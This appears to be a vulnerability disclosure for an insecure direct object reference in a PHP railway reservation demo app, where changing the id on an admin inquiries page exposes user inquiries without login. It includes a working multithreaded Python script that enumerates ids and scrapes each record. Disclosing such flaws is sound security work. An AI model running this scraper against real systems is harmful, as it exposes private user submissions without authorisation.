# Broken Access Control (Improper Access Control) vulnerability was discovered in SourceCoderster Online Railway Reservation System 
---
## CVE-2024-XXXX

Vulnerability Analysis:
---

Affected product: [Railway Reservation System](https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html)

Affected Endpoint: `orrs/admin/inquiries/view_details.php?id=*`

Vulnerability Analysis:
---

A Broken Access Control (Improper Access Control) vulnerability was discovered in SourceCoderster Online Railway Reservation System  where a unauthorized user and directly access inquiries submitted by users to Administrator This can be Demonstrated with this steps:

Affected Product: [Online Railway Reservation System](https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html)
 

Exploitation:
---

1. Directly Pointing to the http://your_host/orrs/admin/inquiries/view_details.php?id=*  
2. By Changing the Id  parameter value a Unauthorized User can directly Access The Inquiry


OR USE this Python Script:

Python

```
import requests
import threading
from bs4 import BeautifulSoup

def send_request_and_extract_data(id):
    url = f"http://localhost/orrs/admin/inquiries/view_details.php?id={id}"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    data = []
    for dl in soup.find_all('dl'):
        for dt, dd in zip(dl.find_all('dt', class_='text-primary'), dl.find_all('dd', class_='pl-4')):
            data.append((dt.text, dd.text))

    print(f"ID: {id}")
    for item in data:
        print(f"{item[0]}: {item[1]}")
    print()

def main():
    from_id = int(input("Enter the starting ID: "))
    to_id = int(input("Enter the ending ID: "))

    threads = []
    for id in range(from_id, to_id + 1):
        t = threading.Thread(target=send_request_and_extract_data, args=(id,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()


```
Usage

```
python3 exp.py

```
